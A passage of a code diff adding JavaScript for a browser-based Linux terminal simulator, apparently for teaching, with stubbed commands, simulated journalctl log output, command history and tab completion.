+  touch: (args) => { if (!args[0]) { print('touch: missing operand','err'); return; } print(`(simulated) created: ${args[0]}`,'dim'); },
+  mkdir: (args) => { if (!args[0]) { print('mkdir: missing operand','err'); return; } print(`(simulated) mkdir: created directory '${args[0]}'`,'dim'); },
+  echo: (args) => print(escHtml(args.join(' '))),
+  'journalctl': (args) => {
+    const cmd = args.join(' ');
+    if (cmd.includes('-u ssh')) {
+      print('Aug 01 08:00:00 homelab systemd[1]: Starting OpenBSD Secure Shell server...');
+      print('Aug 01 08:00:01 homelab sshd[891]: Server listening on 0.0.0.0 port 22.');
+      print('Aug 01 09:33:11 homelab sshd[1456]: Failed password for root from 45.33.32.156', 'warn');
+    } else if (cmd.includes('-p err')) {
+      print('Aug 01 10:05:22 homelab kernel: EXT4-fs error (device sda1)', 'err');
+      print('Aug 01 11:20:01 homelab cron[2891]: failed to run: /tmp/tmp_backup.sh permission error', 'err');
+    } else { print('-- Logs begin at Sun 2024-07-28 00:00:00 UTC. --','dim'); print('Aug 01 10:14:22 homelab sshd[1234]: Accepted publickey for student'); }
+  },
+};
+
+function runCmd(cmd) {
+  cmd = cmd.trim();
+  if (!cmd) return;
+  history.push(cmd);
+  histIdx = history.length;
+  printCmd(cmd);
+  const parts = cmd.split(/\s+/);
+  const name = parts[0];
+  const args = parts.slice(1);
+  const handler = COMMANDS[name];
+  if (handler) { handler(args); }
+  else if (name === 'man') { print(`man: command '${escHtml(args[0]||'')}' — use 'help' in this simulator`, 'dim'); }
+  else if (name === 'vim' || name === 'nano' || name === 'vi') { print(`${name}: interactive editors not supported in this simulator`, 'dim'); }
+  else if (name === 'apt' || name === 'apt-get') { print(`(simulated) apt: package manager — install packages on a real system`, 'dim'); }
+  else { print(`bash: ${escHtml(name)}: command not found`, 'err'); }
+}
+
+function runQuick(cmd) { input.value = cmd; input.focus(); }
+
+input.addEventListener('keydown', e => {
+  if (e.key === 'Enter') { runCmd(input.value); input.value = ''; }
+  else if (e.key === 'ArrowUp') { if (histIdx > 0) { histIdx--; input.value = history[histIdx]; } e.preventDefault(); }
+  else if (e.key === 'ArrowDown') { if (histIdx < history.length-1) { histIdx++; input.value = history[histIdx]; } else { histIdx = history.length; input.value = ''; } e.preventDefault(); }
+  else if (e.key === 'Tab') {
+    e.preventDefault();
+    const partial = input.value.split(' ').pop();
+    const all = Object.keys(COMMANDS);
+    const matches = all.filter(c => c.startsWith(partial));
+    if (matches.length === 1) { const words = input.value.split(' '); words[words.length-1] = matches[0]; input.value = words.join(' '); }
+    else if (matches.length > 1) { print(matches.join('  '), 'dim'); }
+  }
+});
+
+input.focus();
+document.body.addEventListener('click', () => input.focus());
+</script>
